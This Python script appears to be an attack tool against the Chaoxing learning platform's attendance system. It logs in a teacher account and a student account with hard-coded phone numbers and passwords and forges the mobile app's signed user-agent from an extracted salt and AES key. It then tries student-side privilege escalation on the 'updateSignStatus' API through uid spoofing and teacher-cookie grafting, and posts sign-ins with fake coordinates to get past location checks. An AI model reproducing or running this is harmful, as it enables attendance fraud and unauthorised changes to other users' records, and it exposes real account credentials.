import base64, hashlib, json, os, uuid, requests, urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_courses(session):
    r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
                "roletype": c.get("roletype", 0),
                "bbsid": str(c.get("bbsid", "")),
            })
    return courses

def run():
    print("=" * 80)
    print(f"查找'111'班级并深入测试updateSignStatus")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录两个账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    print("\n[2] 教师账号课程列表:")
    courses_t = get_courses(s_t)
    for c in courses_t:
        print(f"  name='{c['name']}', courseid={c['courseid']}, classid={c['classid']}, cpi={c['cpi']}, roletype={c['roletype']}")

    print("\n[3] 学生账号课程列表:")
    courses_s = get_courses(s_s)
    for c in courses_s:
        print(f"  name='{c['name']}', courseid={c['courseid']}, classid={c['classid']}, cpi={c['cpi']}, roletype={c['roletype']}")

    target = None
    for c in courses_s:
        if "111" in c["name"] or "exam" in c["name"].lower():
            target = c
            print(f"\n  找到目标(学生): {c}")
            break
    if not target:
        for c in courses_t:
            if "111" in c["name"] or "exam" in c["name"].lower():
                target = c
                print(f"\n  找到目标(教师): {c}")
                break
    if not target:
        print("\n  未找到'111'或'exam'课程，尝试搜索所有课程名...")
        all_names = set()
        for c in courses_t + courses_s:
            all_names.add(c["name"])
        print(f"  所有课程名: {all_names}")

        for c in courses_s:
            if c not in courses_t:
                print(f"  学生独有课程: name='{c['name']}', courseid={c['courseid']}, classid={c['classid']}")

        if courses_s:
            target = courses_s[0]
            print(f"\n  使用学生第一个课程作为目标: {target}")

    if not target:
        print("  没有可用课程！")
        return

    course_id = target["courseid"]
    class_id = target["classid"]
    cpi = target["cpi"]
    print(f"\n  目标: courseId={course_id}, classId={class_id}, cpi={cpi}")

    base = "https://mobilelearn.chaoxing.com"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n[4] 获取签到活动列表(教师):")
    r = s_t.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": course_id, "classId": class_id, "uid": puid_t}, timeout=20)
    d = safe_json(r)
    active_t = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"][:10]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_t.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
            print(f"  活动: id={aid}, type={atype}, status={status}, name={name}")
    else:
        print(f"  响应: {r.text[:300]}")

    print("\n[5] 获取签到活动列表(学生):")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": course_id, "classId": class_id, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_s = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"][:10]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_s.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
            print(f"  活动: id={aid}, type={atype}, status={status}, name={name}")
    else:
        print(f"  响应: {r.text[:300]}")

    active_ids = active_s if active_s else active_t
    if not active_ids:
        print("  没有签到活动！")
        return

    test_aid = active_ids[0]["id"]
    print(f"\n  使用活动ID={test_aid}进行测试")

    print("\n" + "=" * 80)
    print("[6] updateSignStatus API - 教师账号（roletype=3）")
    print("=" * 80)

    test_params = [
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "0"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "signStatus": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "signResultType": "1"},
    ]

    for i, params in enumerate(test_params):
        r = s_t.post(f"{base}/pptSign/updateSignStatus", data=params, headers=ajax_hdr, timeout=20)
        param_key = [k for k in params if k not in ("activeId", "classId", "courseId") and k != "uid"]
        print(f"  T6-{i}: {', '.join(f'{k}={v}' for k, v in params.items() if k in param_key)} => {r.text[:100]}")

    print("\n" + "=" * 80)
    print("[7] updateSignStatus API - 学生账号越权测试")
    print("=" * 80)

    student_tests = [
        (s_s, {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生-修改自己状态"),
        (s_s, {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1", "role": "1"},
         "学生+role=1"),
        (s_s, {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1"},
         "学生+uid=教师"),
        (s_s, {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1", "roletype": "1"},
         "学生+roletype=1"),
    ]

    for session, params, desc in student_tests:
        r = session.post(f"{base}/pptSign/updateSignStatus", data=params, headers=ajax_hdr, timeout=20)
        print(f"  {desc}: {r.text[:100]}")

    print("\n" + "=" * 80)
    print("[8] 使用教师Cookie的学生Session测试")
    print("=" * 80)

    s_hybrid = requests.Session()
    s_hybrid.verify = False
    s_hybrid.headers.update(s_s.headers)
    for c in s_t.cookies:
        s_hybrid.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = s_hybrid.post(f"{base}/pptSign/updateSignStatus",
                      data={"activeId": test_aid, "classId": class_id, "courseId": course_id,
                            "uid": puid_t, "studentId": puid_s, "status": "1"},
                      headers=ajax_hdr, timeout=20)
    print(f"  教师Cookie+学生UA: {r.text[:100]}")

    r = s_hybrid.post(f"{base}/pptSign/updateSignStatus",
                      data={"activeId": test_aid, "classId": class_id, "courseId": course_id,
                            "uid": puid_s, "studentId": puid_s, "status": "1"},
                      headers=ajax_hdr, timeout=20)
    print(f"  教师Cookie+学生uid: {r.text[:100]}")

    print("\n" + "=" * 80)
    print("[9] updateSignStatus - 所有活动测试")
    print("=" * 80)

    for act in active_ids[:5]:
        aid = act["id"]
        r = s_t.post(f"{base}/pptSign/updateSignStatus",
                     data={"activeId": aid, "classId": class_id, "courseId": course_id,
                           "uid": puid_t, "studentId": puid_s, "status": "1"},
                     headers=ajax_hdr, timeout=20)
        print(f"  aid={aid} (type={act['type']}, status={act['status']}): {r.text[:100]}")

        r = s_s.post(f"{base}/pptSign/updateSignStatus",
                     data={"activeId": aid, "classId": class_id, "courseId": course_id,
                           "uid": puid_s, "studentId": puid_s, "status": "1"},
                     headers=ajax_hdr, timeout=20)
        print(f"  学生 aid={aid}: {r.text[:100]}")

    print("\n" + "=" * 80)
    print("[10] signedResult API - 获取签到结果详情")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_t.get(f"{base}/pptSign/signedResult",
                    params={"activeId": aid, "classId": class_id, "courseId": course_id, "uid": puid_t},
                    headers={"Referer": f"{base}/"}, timeout=20)
        print(f"  教师 signedResult aid={aid}: HTTP {r.status_code}, len={len(r.text)}, {r.text[:200]}")

        r = s_s.get(f"{base}/pptSign/signedResult",
                    params={"activeId": aid, "classId": class_id, "courseId": course_id, "uid": puid_s},
                    headers={"Referer": f"{base}/"}, timeout=20)
        print(f"  学生 signedResult aid={aid}: HTTP {r.status_code}, len={len(r.text)}, {r.text[:200]}")

    print("\n" + "=" * 80)
    print("[11] preSign页面 - 获取签到配置信息")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_s.get(f"{base}/newsign/preSign",
                    params={"activeId": aid, "classId": class_id, "courseId": course_id, "uid": puid_s},
                    timeout=20)
        if r.status_code == 200 and len(r.text) > 100:
            import re
            signstatus = re.findall(r'signstatus\s*=\s*["\']?(\d+)["\']?', r.text)
            lat = re.findall(r'latitude["\']?\s*(?:value|=)\s*["\']?([-\d.]+)', r.text)
            lng = re.findall(r'longitude["\']?\s*(?:value|=)\s*["\']?([-\d.]+)', r.text)
            apis = set(re.findall(r'/pptSign/\w+', r.text) + re.findall(r'/ppt/activeAPI/\w+', r.text))
            print(f"  aid={aid}: HTTP {r.status_code}, len={len(r.text)}, signstatus={signstatus}, lat={lat}, lng={lng}, apis={apis}")
        else:
            print(f"  aid={aid}: HTTP {r.status_code}, len={len(r.text)}")

    print("\n" + "=" * 80)
    print("[12] 尝试直接构造签到请求（绕过位置验证）")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_s.get(f"{base}/pptSign/stuSignajax",
                    params={"activeId": aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                            "longitude": "-1", "appType": "15", "fid": "0"},
                    timeout=20)
        print(f"  stuSignajax aid={aid} (lat=-1): {r.text[:100]}")

    print("\n完成！")

if __name__ == "__main__":
    run()
